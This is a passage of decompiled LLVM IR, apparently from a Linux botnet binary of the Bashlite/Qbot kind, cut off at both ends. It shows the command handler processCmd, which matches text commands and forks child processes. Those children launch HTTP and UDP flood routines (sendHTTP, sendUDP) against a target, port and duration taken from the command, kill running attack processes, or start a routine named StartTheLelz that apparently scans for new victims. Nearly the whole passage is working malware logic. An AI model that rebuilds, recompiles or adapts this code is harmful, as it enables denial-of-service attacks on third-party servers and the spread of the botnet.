  uselistorder i32 (i32)* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 -16, { 1, 0, 3, 2, 5, 4, 6 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10005998, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10005888.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10005814, { 1, 0 }
  uselistorder label %dec_label_pc_1000578c, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10005668, { 1, 0 }
  uselistorder label %dec_label_pc_100054f0, { 1, 0 }
  uselistorder label %dec_label_pc_100053f0, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_100059f8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_10011c58.28 to i32), i32* @r4, align 4
  %v3_10005a08 = inttoptr i32 %v2_100059f8 to i8*
  %v4_10005a08 = call i32 @__GI_strcoll(i8* %v3_10005a08, i32 ptrtoint ([5 x i8]* @global_var_10011c58.28 to i32))
  %v3_10005a10 = icmp eq i32 %v4_10005a08, 0
  br i1 %v3_10005a10, label %dec_label_pc_10005a18, label %dec_label_pc_10005a38

dec_label_pc_10005a18:                            ; preds = %entry
  %v3_10005a1c = load i32, i32* @global_var_10024a20.27, align 4
  store i32 ptrtoint (i32* @global_var_10005a34.478 to i32), i32* @lr, align 4
  %v5_10005a30 = call i32 @Rootsprintf(i32 %v3_10005a1c, i32 ptrtoint ([6 x i8]* @global_var_10011fec.477 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_1000662c

dec_label_pc_10005a38:                            ; preds = %entry
  %v2_10005a3c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_10011ff4.479 to i32), i32* @r4, align 4
  %v3_10005a4c = inttoptr i32 %v2_10005a3c to i8*
  %v4_10005a4c = call i32 @__GI_strcoll(i8* %v3_10005a4c, i32 ptrtoint ([6 x i8]* @global_var_10011ff4.479 to i32))
  %v3_10005a54 = icmp eq i32 %v4_10005a4c, 0
  br i1 %v3_10005a54, label %dec_label_pc_10005a5c, label %dec_label_pc_10005b64

dec_label_pc_10005a5c:                            ; preds = %dec_label_pc_10005a38
  %v1_10005a60 = add i32 %tmp, 4
  %v1_10005a64 = inttoptr i32 %v1_10005a60 to i32*
  %v2_10005a64 = load i32, i32* %v1_10005a64, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_10011ffc.480 to i32), i32* @r4, align 4
  %v3_10005a74 = inttoptr i32 %v2_10005a64 to i8*
  %v4_10005a74 = call i32 @__GI_strcoll(i8* %v3_10005a74, i32 ptrtoint ([4 x i8]* @global_var_10011ffc.480 to i32))
  %v3_10005a7c = icmp eq i32 %v4_10005a74, 0
  br i1 %v3_10005a7c, label %dec_label_pc_10005a84, label %dec_label_pc_10005ad0

dec_label_pc_10005a84:                            ; preds = %dec_label_pc_10005a5c
  %v3_10005a88 = load i32, i32* @global_var_10024a50.481, align 4
  %v3_10005a8c = icmp eq i32 %v3_10005a88, 0
  br i1 %v3_10005a8c, label %dec_label_pc_1000662c, label %dec_label_pc_10005a94

dec_label_pc_10005a94:                            ; preds = %dec_label_pc_10005a84
  store i32 268458664, i32* @lr, align 4
  %v2_10005aa4 = call i32 @kill(i32 %v3_10005a88, i32 9)
  %v3_10005aac = load i32, i32* @global_var_10024a20.27, align 4
  store i32 268458692, i32* @lr, align 4
  %v5_10005ac0 = call i32 @Rootsprintf(i32 %v3_10005aac, i32 ptrtoint ([14 x i8]* @global_var_10012000.482 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  store i32 0, i32* @global_var_10024a50.481, align 4
  br label %dec_label_pc_10005ad0

dec_label_pc_10005ad0:                            ; preds = %dec_label_pc_10005a5c, %dec_label_pc_10005a94
  %v2_10005ad8 = load i32, i32* %v1_10005a64, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10012010.483 to i32), i32* @r4, align 4
  %v3_10005ae8 = inttoptr i32 %v2_10005ad8 to i8*
  %v4_10005ae8 = call i32 @__GI_strcoll(i8* %v3_10005ae8, i32 ptrtoint ([3 x i8]* @global_var_10012010.483 to i32))
  %v3_10005af0 = icmp eq i32 %v4_10005ae8, 0
  br i1 %v3_10005af0, label %dec_label_pc_10005af8, label %dec_label_pc_10005b64

dec_label_pc_10005af8:                            ; preds = %dec_label_pc_10005ad0
  %v3_10005afc = load i32, i32* @global_var_10024a50.481, align 4
  %v3_10005b00 = icmp eq i32 %v3_10005afc, 0
  br i1 %v3_10005b00, label %dec_label_pc_10005b08, label %dec_label_pc_1000662c

dec_label_pc_10005b08:                            ; preds = %dec_label_pc_10005af8
  store i32 268458764, i32* @lr, align 4
  %v0_10005b08 = call i32 @__libc_fork()
  %v3_10005b28 = icmp eq i32 %v0_10005b08, 0
  br i1 %v3_10005b28, label %dec_label_pc_10005b40, label %dec_label_pc_10005b30

dec_label_pc_10005b30:                            ; preds = %dec_label_pc_10005b08
  store i32 %v0_10005b08, i32* @global_var_10024a50.481, align 4
  br label %dec_label_pc_1000662c

dec_label_pc_10005b40:                            ; preds = %dec_label_pc_10005b08
  %v3_10005b58 = call i32 @StartTheLelz(i32 10, i32 1000, i32 -1)
  %v1_10005b60 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10005b64

dec_label_pc_10005b64:                            ; preds = %dec_label_pc_10005ad0, %dec_label_pc_10005a38, %dec_label_pc_10005b40
  %v2_10005b68 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_10012014.485 to i32), i32* @r4, align 4
  %v3_10005b78 = inttoptr i32 %v2_10005b68 to i8*
  %v4_10005b78 = call i32 @__GI_strcoll(i8* %v3_10005b78, i32 ptrtoint ([5 x i8]* @global_var_10012014.485 to i32))
  %v3_10005b80 = icmp eq i32 %v4_10005b78, 0
  br i1 %v3_10005b80, label %dec_label_pc_10005b88, label %dec_label_pc_10005cfc

dec_label_pc_10005b88:                            ; preds = %dec_label_pc_10005b64
  %tmp81 = icmp slt i32 %arg1, 6
  br i1 %tmp81, label %dec_label_pc_1000662c, label %dec_label_pc_10005b94

dec_label_pc_10005b94:                            ; preds = %dec_label_pc_10005b88
  %v1_10005b98 = add i32 %tmp, 12
  %v1_10005b9c = inttoptr i32 %v1_10005b98 to i32*
  %v2_10005b9c = load i32, i32* %v1_10005b9c, align 4
  store i32 268458920, i32* @lr, align 4
  %v2_10005ba4 = call i32 @atol(i32 %v2_10005b9c, i32 %v1_10005b98)
  %tmp82 = icmp slt i32 %v2_10005ba4, 1
  br i1 %tmp82, label %dec_label_pc_1000662c, label %dec_label_pc_10005bb4

dec_label_pc_10005bb4:                            ; preds = %dec_label_pc_10005b94
  %v1_10005bb8 = add i32 %tmp, 20
  %v1_10005bbc = inttoptr i32 %v1_10005bb8 to i32*
  %v2_10005bbc = load i32, i32* %v1_10005bbc, align 4
  store i32 268458952, i32* @lr, align 4
  %v2_10005bc4 = call i32 @atol(i32 %v2_10005bbc, i32 %v1_10005bb8)
  %v2_10005bcc = icmp sgt i32 %v2_10005bc4, 0
  br i1 %v2_10005bcc, label %dec_label_pc_10005bd8, label %dec_label_pc_1000662c

dec_label_pc_10005bd8:                            ; preds = %dec_label_pc_10005bb4
  store i32 268458972, i32* @lr, align 4
  %v0_10005bd8 = call i32 @listFork()
  %v3_10005be0 = icmp eq i32 %v0_10005bd8, 0
  br i1 %v3_10005be0, label %dec_label_pc_10005be8, label %dec_label_pc_1000662c

dec_label_pc_10005be8:                            ; preds = %dec_label_pc_10005bd8
  %v3_10005bec = load i32, i32* @global_var_10024a20.27, align 4
  store i32 %v3_10005bec, i32* @r29, align 4
  %v1_10005bf4 = add i32 %tmp, 4
  %v1_10005bf8 = inttoptr i32 %v1_10005bf4 to i32*
  %v1_10005c00 = add i32 %tmp, 8
  %v1_10005c04 = inttoptr i32 %v1_10005c00 to i32*
  %v2_10005c04 = load i32, i32* %v1_10005c04, align 4
  store i32 %v2_10005c04, i32* @r27, align 4
  %v2_10005c10 = load i32, i32* %v1_10005b9c, align 4
  store i32 268459036, i32* @lr, align 4
  %v2_10005c18 = call i32 @atol(i32 %v2_10005c10, i32 %v1_10005b98)
  %v2_10005c28 = load i32, i32* %v1_10005bbc, align 4
  store i32 268459060, i32* @lr, align 4
  %v2_10005c30 = call i32 @atol(i32 %v2_10005c28, i32 %v1_10005bb8)
  %v0_10005c38 = load i32, i32* @r29, align 4
  %v0_10005c44 = load i32, i32* @r28, align 4
  store i32 268459100, i32* @lr, align 4
  %v8_10005c58 = call i32 @Rootsprintf(i32 %v0_10005c38, i32 ptrtoint ([38 x i8]* @global_var_1001201c.486 to i32), i32 %v0_10005c44)
  %v2_10005c64 = load i32, i32* %v1_10005bf8, align 4
  store i32 %v2_10005c64, i32* @r29, align 4
  %v2_10005c84 = load i32, i32* %v1_10005b9c, align 4
  store i32 268459152, i32* @lr, align 4
  %v2_10005c8c = call i32 @atol(i32 %v2_10005c84, i32 %v1_10005b98)
  %v1_10005c94 = urem i32 %v2_10005c8c, 65536
  store i32 %v1_10005c94, i32* @r27, align 4
  %v2_10005cb0 = load i32, i32* %v1_10005bbc, align 4
  store i32 268459196, i32* @lr, align 4
  %v2_10005cb8 = call i32 @atol(i32 %v2_10005cb0, i32 %v1_10005bb8)
  %v1_10005cc4 = add i32 %tmp, 24
  %v1_10005cc8 = inttoptr i32 %v1_10005cc4 to i32*
  %v2_10005cc8 = load i32, i32* %v1_10005cc8, align 4
  store i32 268459220, i32* @lr, align 4
  %v2_10005cd0 = call i32 @atol(i32 %v2_10005cc8, i32 %v1_10005cc4)
  %v0_10005cd8 = load i32, i32* @r29, align 4
  %v0_10005cdc = load i32, i32* @r28, align 4
  %v0_10005ce0 = load i32, i32* @r27, align 4
  %v0_10005ce4 = load i32, i32* @r26, align 4
  %v0_10005ce8 = load i32, i32* @r25, align 4
  %v6_10005cf0 = trunc i32 %v0_10005ce0 to i16
  %v7_10005cf0 = call i32 @sendHTTP(i32 %v0_10005cd8, i32 %v0_10005cdc, i16 %v6_10005cf0, i32 %v0_10005ce4, i32 %v0_10005ce8, i32 %v2_10005cd0)
  %v0_10005cf8 = call i32 @__GI_exit()
  br label %dec_label_pc_10005cfc

dec_label_pc_10005cfc:                            ; preds = %dec_label_pc_10005b64, %dec_label_pc_10005be8
  %v2_10005d00 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_10012044.488 to i32), i32* @r4, align 4
  %v3_10005d10 = inttoptr i32 %v2_10005d00 to i8*
  %v4_10005d10 = call i32 @__GI_strcoll(i8* %v3_10005d10, i32 ptrtoint ([4 x i8]* @global_var_10012044.488 to i32))
  %v3_10005d18 = icmp eq i32 %v4_10005d10, 0
  br i1 %v3_10005d18, label %dec_label_pc_10005d20, label %dec_label_pc_10006084

dec_label_pc_10005d20:                            ; preds = %dec_label_pc_10005cfc
  %tmp83 = icmp slt i32 %arg1, 6
  br i1 %tmp83, label %dec_label_pc_10005e54, label %dec_label_pc_10005d2c

dec_label_pc_10005d2c:                            ; preds = %dec_label_pc_10005d20
  %v1_10005d30 = add i32 %tmp, 12
  %v1_10005d34 = inttoptr i32 %v1_10005d30 to i32*
  %v2_10005d34 = load i32, i32* %v1_10005d34, align 4
  store i32 268459328, i32* @lr, align 4
  %v2_10005d3c = call i32 @atol(i32 %v2_10005d34, i32 %v1_10005d30)
  %v4_10005d48 = icmp eq i32 %v2_10005d3c, -1
  br i1 %v4_10005d48, label %dec_label_pc_10005e54, label %dec_label_pc_10005d50

dec_label_pc_10005d50:                            ; preds = %dec_label_pc_10005d2c
  %v1_10005d54 = add i32 %tmp, 8
  %v1_10005d58 = inttoptr i32 %v1_10005d54 to i32*
  %v2_10005d58 = load i32, i32* %v1_10005d58, align 4
  store i32 268459364, i32* @lr, align 4
  %v2_10005d60 = call i32 @atol(i32 %v2_10005d58, i32 %v1_10005d54)
  %v4_10005d6c = icmp eq i32 %v2_10005d60, -1
  br i1 %v4_10005d6c, label %dec_label_pc_10005e54, label %dec_label_pc_10005d74

dec_label_pc_10005d74:                            ; preds = %dec_label_pc_10005d50
  %v1_10005d78 = add i32 %tmp, 16
  %v1_10005d7c = inttoptr i32 %v1_10005d78 to i32*
  %v2_10005d7c = load i32, i32* %v1_10005d7c, align 4
  store i32 268459400, i32* @lr, align 4
  %v2_10005d84 = call i32 @atol(i32 %v2_10005d7c, i32 %v1_10005d78)
  %v4_10005d90 = icmp eq i32 %v2_10005d84, -1
  br i1 %v4_10005d90, label %dec_label_pc_10005e54, label %dec_label_pc_10005d98

dec_label_pc_10005d98:                            ; preds = %dec_label_pc_10005d74
  %v1_10005d9c = add i32 %tmp, 20
  %v1_10005da0 = inttoptr i32 %v1_10005d9c to i32*
  %v2_10005da0 = load i32, i32* %v1_10005da0, align 4
  store i32 268459436, i32* @lr, align 4
  %v2_10005da8 = call i32 @atol(i32 %v2_10005da0, i32 %v1_10005d9c)
  %v4_10005db4 = icmp eq i32 %v2_10005da8, -1
  br i1 %v4_10005db4, label %dec_label_pc_10005e54, label %dec_label_pc_10005dbc

dec_label_pc_10005dbc:                            ; preds = %dec_label_pc_10005d98
  %v2_10005dc4 = load i32, i32* %v1_10005da0, align 4
  store i32 268459472, i32* @lr, align 4
  %v2_10005dcc = call i32 @atol(i32 %v2_10005dc4, i32 %v1_10005d9c)
  %v3_10005dd8 = icmp sgt i32 %v2_10005dcc, 65536
  br i1 %v3_10005dd8, label %dec_label_pc_10005e54, label %dec_label_pc_10005de0

dec_label_pc_10005de0:                            ; preds = %dec_label_pc_10005dbc
  %v2_10005de8 = load i32, i32* %v1_10005da0, align 4
  store i32 268459508, i32* @lr, align 4
  %v2_10005df0 = call i32 @atol(i32 %v2_10005de8, i32 %v1_10005d9c)
  %v3_10005e00 = icmp sgt i32 %v2_10005df0, 65500
  br i1 %v3_10005e00, label %dec_label_pc_10005e54, label %dec_label_pc_10005e08

dec_label_pc_10005e08:                            ; preds = %dec_label_pc_10005de0
  %v2_10005e10 = load i32, i32* %v1_10005d7c, align 4
  store i32 268459548, i32* @lr, align 4
  %v2_10005e18 = call i32 @atol(i32 %v2_10005e10, i32 %v1_10005d78)
  %v2_10005e20 = icmp sgt i32 %v2_10005e18, 32
  br i1 %v2_10005e20, label %dec_label_pc_10005e54, label %dec_label_pc_10005e28

dec_label_pc_10005e28:                            ; preds = %dec_label_pc_10005e08
  %v1_10005e2c = icmp slt i32 %arg1, 7
  %v3_10005e2c = icmp eq i32 %arg1, 7
  br i1 %v3_10005e2c, label %dec_label_pc_10005e34, label %dec_label_pc_10005e74

dec_label_pc_10005e34:                            ; preds = %dec_label_pc_10005e28
  %v1_10005e38 = add i32 %tmp, 24
  %v1_10005e3c = inttoptr i32 %v1_10005e38 to i32*
  %v2_10005e3c = load i32, i32* %v1_10005e3c, align 4
  store i32 268459592, i32* @lr, align 4
  %v2_10005e44 = call i32 @atol(i32 %v2_10005e3c, i32 %v1_10005e38)
  %v2_10005e4c = icmp sgt i32 %v2_10005e44, 0
  br i1 %v2_10005e4c, label %dec_label_pc_10005e74, label %dec_label_pc_10005e54

dec_label_pc_10005e54:                            ; preds = %dec_label_pc_10005e34, %dec_label_pc_10005e08, %dec_label_pc_10005de0, %dec_label_pc_10005dbc, %dec_label_pc_10005d98, %dec_label_pc_10005d74, %dec_label_pc_10005d50, %dec_label_pc_10005d2c, %dec_label_pc_10005d20
  %v3_10005e58 = load i32, i32* @global_var_10024a20.27, align 4
  store i32 ptrtoint (i32* @global_var_10005e70.490 to i32), i32* @lr, align 4
  %v5_10005e6c = call i32 @Rootsprintf(i32 %v3_10005e58, i32 ptrtoint ([113 x i8]* @global_var_10012048.489 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_1000662c

dec_label_pc_10005e74:                            ; preds = %dec_label_pc_10005e28, %dec_label_pc_10005e34
  %v1_10005e78 = add i32 %tmp, 4
  %v1_10005e7c = inttoptr i32 %v1_10005e78 to i32*
  %v2_10005e7c = load i32, i32* %v1_10005e7c, align 4
  %v2_10005e8c = load i32, i32* %v1_10005d58, align 4
  store i32 268459672, i32* @lr, align 4
  %v2_10005e94 = call i32 @atol(i32 %v2_10005e8c, i32 %v1_10005d54)
  %v2_10005ea8 = load i32, i32* %v1_10005d34, align 4
  store i32 268459700, i32* @lr, align 4
  %v2_10005eb0 = call i32 @atol(i32 %v2_10005ea8, i32 %v1_10005d30)
  %v2_10005ec4 = load i32, i32* %v1_10005d7c, align 4
  store i32 268459728, i32* @lr, align 4
  %v2_10005ecc = call i32 @atol(i32 %v2_10005ec4, i32 %v1_10005d78)
  %v2_10005ee0 = load i32, i32* %v1_10005da0, align 4
  store i32 268459756, i32* @lr, align 4
  %v2_10005ee8 = call i32 @atol(i32 %v2_10005ee0, i32 %v1_10005d9c)
  br i1 %v1_10005e2c, label %dec_label_pc_10005f24.thread, label %dec_label_pc_10005f24

dec_label_pc_10005f24.thread:                     ; preds = %dec_label_pc_10005e74
  br label %dec_label_pc_10005f54

dec_label_pc_10005f24:                            ; preds = %dec_label_pc_10005e74
  %v1_10005f04 = add i32 %tmp, 24
  %v1_10005f08 = inttoptr i32 %v1_10005f04 to i32*
  %v2_10005f08 = load i32, i32* %v1_10005f08, align 4
  store i32 268459796, i32* @lr, align 4
  %v2_10005f10 = call i32 @atol(i32 %v2_10005f08, i32 %v1_10005f04)
  br i1 %v3_10005e2c, label %dec_label_pc_10005f54, label %dec_label_pc_10005f38

dec_label_pc_10005f38:                            ; preds = %dec_label_pc_10005f24
  %v1_10005f3c = add i32 %tmp, 28
  %v1_10005f40 = inttoptr i32 %v1_10005f3c to i32*
  %v2_10005f40 = load i32, i32* %v1_10005f40, align 4
  store i32 268459852, i32* @lr, align 4
  %v2_10005f48 = call i32 @atol(i32 %v2_10005f40, i32 %v1_10005f3c)
  br label %dec_label_pc_10005f68

dec_label_pc_10005f54:                            ; preds = %dec_label_pc_10005f24.thread, %dec_label_pc_10005f24
  %storemerge817 = phi i32 [ 1000, %dec_label_pc_10005f24.thread ], [ %v2_10005f10, %dec_label_pc_10005f24 ]
  br label %dec_label_pc_10005f68

dec_label_pc_10005f68:                            ; preds = %dec_label_pc_10005f38, %dec_label_pc_10005f54
  %storemerge816 = phi i32 [ %storemerge817, %dec_label_pc_10005f54 ], [ %v2_10005f10, %dec_label_pc_10005f38 ]
  %storemerge7 = phi i32 [ 1000000, %dec_label_pc_10005f54 ], [ %v2_10005f48, %dec_label_pc_10005f38 ]
  %tmp85 = icmp slt i32 %arg1, 9
  br i1 %tmp85, label %dec_label_pc_10005f98, label %dec_label_pc_10005f7c

dec_label_pc_10005f7c:                            ; preds = %dec_label_pc_10005f68
  %v1_10005f80 = add i32 %tmp, 32
  %v1_10005f84 = inttoptr i32 %v1_10005f80 to i32*
  %v2_10005f84 = load i32, i32* %v1_10005f84, align 4
  store i32 268459920, i32* @lr, align 4
  %v2_10005f8c = call i32 @atol(i32 %v2_10005f84, i32 %v1_10005f80)
  br label %dec_label_pc_10005fa0

dec_label_pc_10005f98:                            ; preds = %dec_label_pc_10005f68
  br label %dec_label_pc_10005fa0

dec_label_pc_10005fa0:                            ; preds = %dec_label_pc_10005f7c, %dec_label_pc_10005f98
  %storemerge6 = phi i32 [ 0, %dec_label_pc_10005f98 ], [ %v2_10005f8c, %dec_label_pc_10005f7c ]
  store i32 %v2_10005e7c, i32* @r3, align 4
  store i32 268459960, i32* @lr, align 4
  %v2_10005fb4 = call i32 @__GI_strchr(i32 %v2_10005e7c, i32 44)
  %v3_10005fbc = icmp eq i32 %v2_10005fb4, 0
  br i1 %v3_10005fbc, label %dec_label_pc_10006048, label %dec_label_pc_10005fc4

dec_label_pc_10005fc4:                            ; preds = %dec_label_pc_10005fa0
  store i32 ptrtoint (i32* @global_var_10011fc0.469 to i32), i32* @r4, align 4
  store i32 268459992, i32* @lr, align 4
  %v4_10005fd4 = call i32 @__GI_strtok(i32 %v2_10005e7c, i32 ptrtoint (i32* @global_var_10011fc0.469 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  %v3_1000603c29 = icmp eq i32 %v4_10005fd4, 0
  br i1 %v3_1000603c29, label %dec_label_pc_1000662c, label %dec_label_pc_10005fe4

dec_label_pc_10005fe4:                            ; preds = %dec_label_pc_10005fc4, %dec_label_pc_10006020
  %storemerge1530 = phi i32 [ %v4_1000602c, %dec_label_pc_10006020 ], [ %v4_10005fd4, %dec_label_pc_10005fc4 ]
  store i32 268460008, i32* @lr, align 4
  %v0_10005fe4 = call i32 @listFork()
  %v3_10005fec = icmp eq i32 %v0_10005fe4, 0
  br i1 %v3_10005fec, label %dec_label_pc_10005ff4, label %dec_label_pc_10006020

dec_label_pc_10005ff4:                            ; preds = %dec_label_pc_10005fe4
  store i32 %storemerge6, i32* @r10, align 4
  %v7_10006014 = call i32 @sendUDP(i32 %storemerge1530, i32 %v2_10005e94, i32 %v2_10005eb0, i32 %v2_10005ecc, i32 %v2_10005ee8, i32 %storemerge816, i32 %storemerge7)
  %v1_1000601c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10006020

dec_label_pc_10006020:                            ; preds = %dec_label_pc_10005fe4, %dec_label_pc_10005ff4
  store i32 ptrtoint (i32* @global_var_10011fc0.469 to i32), i32* @r4, align 4
  store i32 268460080, i32* @lr, align 4
  %v4_1000602c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10011fc0.469 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  %v3_1000603c = icmp eq i32 %v4_1000602c, 0
  br i1 %v3_1000603c, label %dec_label_pc_1000662c, label %dec_label_pc_10005fe4

dec_label_pc_10006048:                            ; preds = %dec_label_pc_10005fa0
  store i32 268460108, i32* @lr, align 4
  %v0_10006048 = call i32 @listFork()
  %v3_10006050 = icmp eq i32 %v0_10006048, 0
  br i1 %v3_10006050, label %dec_label_pc_10006058, label %dec_label_pc_1000662c

dec_label_pc_10006058:                            ; preds = %dec_label_pc_10006048
  store i32 %storemerge6, i32* @r10, align 4
  %v7_10006078 = call i32 @sendUDP(i32 %v2_10005e7c, i32 %v2_10005e94, i32 %v2_10005eb0, i32 %v2_10005ecc, i32 %v2_10005ee8, i32 %storemerge816, i32 %storemerge7)
  %v1_10006080 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10006084

dec_label_pc_10006084:                            ; preds = %dec_label_pc_10005cfc, %dec_label_pc_10006058
  %v2_10006088 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_100120bc.494 to i32), i32* @r4, align 4
  %v3_10006098 = inttoptr i32 %v2_10006088 to i8*
  %v4_10006098 = call i32 @__GI_strcoll(i8* %v3_10006098, i32 ptrtoint ([4 x i8]* @global_var_100120bc.494 to i32))
  %v3_100060a0 = icmp eq i32 %v4_10006098, 0
  br i1 %v3_100060a0, label %dec_label_pc_100060a8, label %dec_label_pc_10006370

dec_label_pc_100060a8:                            ; preds = %dec_label_pc_10006084
  %tmp86 = icmp slt i32 %arg1, 6
  br i1 %tmp86, label %dec_label_pc_10006198, label %dec_label_pc_100060b4

dec_label_pc_100060b4:                            ; preds = %dec_label_pc_100060a8
  %v1_100060b8 = add i32 %tmp, 12
  %v1_100060bc = inttoptr i32 %v1_100060b8 to i32*
  %v2_100060bc = load i32, i32* %v1_100060bc, align 4
  store i32 268460232, i32* @lr, align 4
  %v2_100060c4 = call i32 @atol(i32 %v2_100060bc, i32 %v1_100060b8)
  %v4_100060d0 = icmp eq i32 %v2_100060c4, -1
  br i1 %v4_100060d0, label %dec_label_pc_10006198, label %dec_label_pc_100060d8

dec_label_pc_100060d8:                            ; preds = %dec_label_pc_100060b4
  %v1_100060dc = add i32 %tmp, 8
  %v1_100060e0 = inttoptr i32 %v1_100060dc to i32*
  %v2_100060e0 = load i32, i32* %v1_100060e0, align 4
  store i32 268460268, i32* @lr, align 4
  %v2_100060e8 = call i32 @atol(i32 %v2_100060e0, i32 %v1_100060dc)
  %v4_100060f4 = icmp eq i32 %v2_100060e8, -1
  br i1 %v4_100060f4, label %dec_label_pc_10006198, label %dec_label_pc_100060fc

dec_label_pc_100060fc:                            ; preds = %dec_label_pc_100060d8
  %v1_10006100 = add i32 %tmp, 16
  %v1_10006104 = inttoptr i32 %v1_10006100 to i32*
  %v2_10006104 = load i32, i32* %v1_10006104, align 4
  store i32 268460304, i32* @lr, align 4
  %v2_1000610c = call i32 @atol(i32 %v2_10006104, i32 %v1_10006100)
  %v4_10006118 = icmp eq i32 %v2_1000610c, -1
  br i1 %v4_10006118, label %dec_label_pc_10006198, label %dec_label_pc_10006120

dec_label_pc_10006120:                            ; preds = %dec_label_pc_100060fc
  %v2_10006128 = load i32, i32* %v1_10006104, align 4
  store i32 268460340, i32* @lr, align 4
  %v2_10006130 = call i32 @atol(i32 %v2_10006128, i32 %v1_10006100)
  %v2_10006138 = icmp sgt i32 %v2_10006130, 32
  br i1 %v2_10006138, label %dec_label_pc_10006198, label %dec_label_pc_10006140

dec_label_pc_10006140:                            ; preds = %dec_label_pc_10006120
  %tmp87 = icmp slt i32 %arg1, 7
  br i1 %tmp87, label %dec_label_pc_1000616c, label %dec_label_pc_1000614c

dec_label_pc_1000614c:                            ; preds = %dec_label_pc_10006140
  %v1_10006150 = add i32 %tmp, 24
  %v1_10006154 = inttoptr i32 %v1_10006150 to i32*
  %v2_10006154 = load i32, i32* %v1_10006154, align 4
  store i32 268460384, i32* @lr, align 4
  %v2_1000615c = call i32 @atol(i32 %v2_10006154, i32 %v1_10006150)
  %v1_10006164 = icmp slt i32 %v2_1000615c, 0
  br i1 %v1_10006164, label %dec_label_pc_10006198, label %dec_label_pc_1000616c

dec_label_pc_1000616c:                            ; preds = %dec_label_pc_1000614c, %dec_label_pc_10006140
  %v3_10006170 = icmp eq i32 %arg1, 8
  br i1 %v3_10006170, label %dec_label_pc_10006178, label %dec_label_pc_100061b8

dec_label_pc_10006178:                            ; preds = %dec_label_pc_1000616c
  %v1_1000617c = add i32 %tmp, 28
  %v1_10006180 = inttoptr i32 %v1_1000617c to i32*
  %v2_10006180 = load i32, i32* %v1_10006180, align 4
  store i32 268460428, i32* @lr, align 4
  %v2_10006188 = call i32 @atol(i32 %v2_10006180, i32 %v1_1000617c)
  %v2_10006190 = icmp sgt i32 %v2_10006188, 0
  br i1 %v2_10006190, label %dec_label_pc_100061b8, label %dec_label_pc_10006198

dec_label_pc_10006198:                            ; preds = %dec_label_pc_10006178, %dec_label_pc_1000614c, %dec_label_pc_10006120, %dec_label_pc_100060fc, %dec_label_pc_100060d8, %dec_label_pc_100060b4, %dec_label_pc_100060a8
  %v3_1000619c = load i32, i32* @global_var_10024a20.27, align 4
  store i32 ptrtoint (i32* @global_var_100061b4.496 to i32), i32* @lr, align 4
  %v5_100061b0 = call i32 @Rootsprintf(i32 %v3_1000619c, i32 ptrtoint ([186 x i8]* @global_var_100120c0.495 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_1000662c

dec_label_pc_100061b8:                            ; preds = %dec_label_pc_1000616c, %dec_label_pc_10006178
  %v1_100061bc = add i32 %tmp, 4
  %v1_100061c0 = inttoptr i32 %v1_100061bc to i32*
  %v2_100061c0 = load i32, i32* %v1_100061c0, align 4
  %v2_100061d0 = load i32, i32* %v1_100060e0, align 4
  store i32 268460508, i32* @lr, align 4
  %v2_100061d8 = call i32 @atol(i32 %v2_100061d0, i32 %v1_100060dc)
  %v2_100061ec = load i32, i32* %v1_100060bc, align 4
  store i32 268460536, i32* @lr, align 4
  %v2_100061f4 = call i32 @atol(i32 %v2_100061ec, i32 %v1_100060b8)
  %v2_10006208 = load i32, i32* %v1_10006104, align 4
  store i32 268460564, i32* @lr, align 4
  %v2_10006210 = call i32 @atol(i32 %v2_10006208, i32 %v1_10006100)
  %v1_10006220 = add i32 %tmp, 20
  %v1_10006224 = inttoptr i32 %v1_10006220 to i32*
  %v2_10006224 = load i32, i32* %v1_10006224, align 4
  br i1 %v3_10006170, label %dec_label_pc_10006238, label %dec_label_pc_10006254

dec_label_pc_10006238:                            ; preds = %dec_label_pc_100061b8
  %v1_1000623c = add i32 %tmp, 28
  %v1_10006240 = inttoptr i32 %v1_1000623c to i32*
  %v2_10006240 = load i32, i32* %v1_10006240, align 4
  store i32 268460620, i32* @lr, align 4
  %v2_10006248 = call i32 @atol(i32 %v2_10006240, i32 %v1_1000623c)
  br label %dec_label_pc_1000625c

dec_label_pc_10006254:                            ; preds = %dec_label_pc_100061b8
  br label %dec_label_pc_1000625c

dec_label_pc_1000625c:                            ; preds = %dec_label_pc_10006238, %dec_label_pc_10006254
  %storemerge5 = phi i32 [ 10, %dec_label_pc_10006254 ], [ %v2_10006248, %dec_label_pc_10006238 ]
  br i1 %tmp87, label %dec_label_pc_1000628c, label %dec_label_pc_10006270

dec_label_pc_10006270:                            ; preds = %dec_label_pc_1000625c
  %v1_10006274 = add i32 %tmp, 24
  %v1_10006278 = inttoptr i32 %v1_10006274 to i32*
  %v2_10006278 = load i32, i32* %v1_10006278, align 4
  store i32 268460676, i32* @lr, align 4
